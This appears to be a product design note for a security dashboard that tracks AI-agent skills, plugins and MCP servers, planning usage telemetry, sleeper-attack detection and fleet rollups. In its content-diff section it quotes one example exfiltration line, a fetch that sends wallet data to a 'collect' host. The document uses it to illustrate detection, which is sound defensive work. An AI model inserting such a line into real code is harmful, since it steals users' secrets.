# Dashboard — next frontier (themes F–H)

Companion to `trust-and-verification-features.md`. That document mapped themes
A–E (trust verdict, provenance, workflow, runtime, reporting) and they are now
**built**: the dashboard ships Changes / Inventory / Findings / Drift / Activity
/ Policy tabs, a per-artifact drawer (trust score breakdown, provenance ladder,
capability diff, integrity, file manifest, runtime activity), approve /
quarantine / freeze / mute / egress-allow writes, the known-malicious and
shadow-extension banners, and a posture trend.

This doc maps what's left **after** A–E, scored against the three questions the
product actually has to answer for a team:

1. **What is installed?** (inventory / attack surface)
2. **Is it safe — and is it still what we approved?** (trust / drift)
3. **What was actually used, and when?** (usage / behavior over time)

## Coverage today

| Axis | Coverage | Gap |
|---|---|---|
| 1. What's installed | **Strong.** Cross-tool inventory (7 agents), kind/agent filters, hash, source, provenance ladder, shadow-extension detection. | No single "attack-surface" rollup; one machine only. |
| 2. Is it safe / still ours | **Strong.** Trust verdict, additive score, capability diff, expected-vs-unexpected drift, advisory feed, locked-vs-disk hash. | Drift is shown as **hashes, not a content diff** — the one view that *proves* a rug-pull is missing. |
| 3. What was used, when | **Weak.** Activity tab shows runtime audit **only for wrapped MCP servers.** | Skills, plugins, hooks, rules, subagents — the majority of artifacts — have **zero** usage signal. No "last used," no counts, no dormancy. |

Axis 3 is the largest real gap and the freshest differentiator. Axes 1–2 are
mature on one machine but stop at the machine boundary — and "protecting *teams*"
is a fleet question, not a per-laptop one.

---

## Theme F — Usage & behavior over time (answers "what was used, when")

The product hashes and judges artifacts at rest but is nearly blind to whether
they ever *run*. A static "this skill can read credentials" is a hypothesis; a
runtime "this skill read credentials 40× this week" is an incident. Assay is
uniquely placed to fuse the two because it owns both the static scan
(Component 1) and the runtime shim (Component 2) — no competitor has both halves.

### F1. Universal last-used / invocation telemetry (not just MCP)
- **Now:** the Activity tab and the audit log only cover MCP servers routed
  through `assay mcp-shim`. Skills/plugins/hooks have no telemetry path.
- **Build:** capture invocation events for **all** artifact kinds. Sources, in
  order of fidelity: (a) MCP shim (already have it); (b) a Claude Code / Codex
  **hook** that logs skill & subagent activation to `~/.assay/audit`; (c)
  best-effort file-access mtime sampling for skills that have no hook surface.
- **Surface:** add `lastUsed`, `useCount`, `firstUsed` to `DashArtifact`; show a
  "Last used 3d ago · 40× / 7d" line per row and a usage sparkline in the drawer.

### F2. Dormant-then-active detection (the sleeper signal)
- The highest-signal supply-chain event Assay can catch that nobody else can:
  an artifact that was **installed long ago, never invoked, then drifts and
  fires for the first time.** That triple — (old install) × (content drift) ×
  (first-ever invocation) — is a textbook sleeper attack and is invisible to
  pure SCA tools.
- **Build:** a domain rule combining lockfile age, drift class, and F1's
  `firstUsed`. Emits a synthetic finding / banner: "dormant 47 days, drifted,
  then ran for the first time — quarantine."

### F3. Capability × usage risk fusion
- Re-rank findings by *exercised* risk: a `secret-access` capability that has
  actually been invoked outranks one that's declared but dormant. Turns the
  Findings tab from "everything that could be bad" into "what is bad *and live*."

### F4. Per-artifact timeline ribbon
- One unified event stream per artifact: installed → approved → drifted →
  invoked → quarantined. The drawer currently shows state, not history. This is
  the "what happened, when" view a reviewer wants in an incident.

---

## Theme G — Fleet / team rollup (answers "what's installed" at team scale)

The dashboard renders **one machine**. `CLAUDE.md` notes the hosted team control
plane is "still designed." For a team, the unique value is the rollup the
existing git-as-backend model can't show: *who has what, and where the blast
radius is.* This stays true to the offline-first ethos if built as an
**aggregation of committed/exported snapshots**, not live telemetry upload.

### G1. Blast-radius view
- "`crypto-price-feed` v2.3.1 just drifted — **3 of 8 engineers** have it
  installed." Answering "who is exposed" the moment an advisory lands is the
  single most valuable team feature and is impossible on one laptop.
- **Build (offline-first path):** each developer's `assay digest --export`
  writes a counts-and-hashes snapshot (no secrets, no code) to a shared git
  path or artifact store; the dashboard aggregates the snapshots. No server
  required for ≤15 people — same "git is the backend" principle as approvals.

### G2. Fleet inventory & drift heatmap
- A matrix: artifacts × developers, colored by verdict/drift. Surfaces
  monoculture risk (everyone runs the same unverified MCP) and outliers (one
  machine has a shadow extension nobody else does).

### G3. Policy conformance across the fleet
- The Policy tab edits one `assay.policy.json`; G3 reports **who is out of
  compliance** with it — machines running blocked publishers or unapproved
  artifacts — turning policy from advisory into measurable.

---

## Theme H — Proof & propagation (sharpens "is it safe")

### H1. Content diff viewer (close the rug-pull loop)
- **Status: file-level diff shipped.** The drawer now has a **Changed files**
  section: `lockfile.DiffFiles` compares the locked vs current file manifests
  (per-file hashes the lockfile already stores) and the UI names exactly which
  files were added (`+`), removed (`−`), or modified (`~`) in a drift — e.g. a
  new `hooks/postinstall.sh` appearing on a "no version bump" mutation. This is
  content-free and fully offline: no bytes stored, no network, no signing churn.
- **Follow-up — line-level red/green.** Naming the file is the offline-honest
  floor; showing the literal `+ fetch("https://collect…", { body: walletData })`
  line needs the *prior content*, which the lockfile deliberately does not store
  (it would bloat the committable file and churn signatures). A future
  **trusted-snapshot store** (content-addressed blobs for approved versions,
  outside the signed lockfile) would let the same `DiffFiles` seam drive a true
  line diff without violating the signing-stability invariant.

### H2. Reachability-aware findings
- A `secret-access` pattern in a code path the agent can't reach is noise.
  Combine the file manifest + capability graph to mark findings
  reachable / unreachable, cutting the false-positive rate the A1 design warns
  about.

### H3. Shared reputation signal (opt-in, privacy-preserving)
- "This exact artifact hash is trusted by N other Assay users; first seen
  2026-04." A hash-only, opt-in lookup (no code, no identity) gives a
  network-effect trust signal that improves with adoption — the moat a purely
  local tool can't build. Must degrade to silent no-op offline (same contract
  as the advisory feed).

---

## Prioritized — leverage per build effort

| # | Feature | Theme | Effort | Why it's unique / urgent |
|---|---|---|---|---|
| H1 | Content diff viewer | Proof | S | **File-level shipped.** Closes the rug-pull loop; line-level needs a snapshot store. |
| F1 | Universal last-used telemetry | Usage | M | Directly answers "what was used, when"; only Assay has static+runtime. |
| F2 | Dormant-then-active detection | Usage | S | Highest-signal attack no SCA tool can see; builds on F1 + drift. |
| G1 | Blast-radius (offline export rollup) | Fleet | M | The core "protect the *team*" feature; offline-first keeps the ethos. |
| F3 | Capability × usage fusion | Usage | S | Cuts finding noise by ranking exercised risk first. |
| F4 | Per-artifact timeline ribbon | Usage | S | Incident-review view; cheap once F1 lands. |
| G2 | Fleet inventory heatmap | Fleet | M | Monoculture / outlier risk; needs G1's snapshots. |
| H2 | Reachability-aware findings | Proof | M | Lowers false positives; needs manifest+capability graph. |
| G3 | Fleet policy conformance | Fleet | M | Makes policy measurable; needs G1. |
| H3 | Shared reputation signal | Proof | L | Network-effect moat; validate privacy model first. |

**The wedge:** H1 + F1 + F2 together are the demo no competitor can give —
*"this skill sat dormant for 47 days, then its content changed (here are the
exact lines added), then it ran for the first time and read your AWS
credentials — and 3 of your 8 engineers have it."* That single narrative spans
all three axes and is only possible because Assay owns cross-tool discovery,
content hashing, and the runtime shim at once.

## Implementation notes (inherit from A–E)
- **Keep the core pure.** Dormancy (F2), reachability (H2), risk fusion (F3) are
  IO-free domain rules — same discipline as `Compare` / trust scoring.
- **One data shape, two front-ends.** Every new `DashArtifact` field
  (`lastUsed`, `useCount`, `firstUsed`, `reachable`) mirrors into
  `assay list` and `scan-data.ts`.
- **Offline-first stays sacred.** Fleet rollup (G) is *exported snapshots
  aggregated from git/artifact store*, not live upload. Reputation (H3) is
  opt-in, hash-only, silent-no-op offline.
- **Usage capture must redact like the audit log already does** — event
  metadata only (which artifact, when, allowed/denied), never argument values.
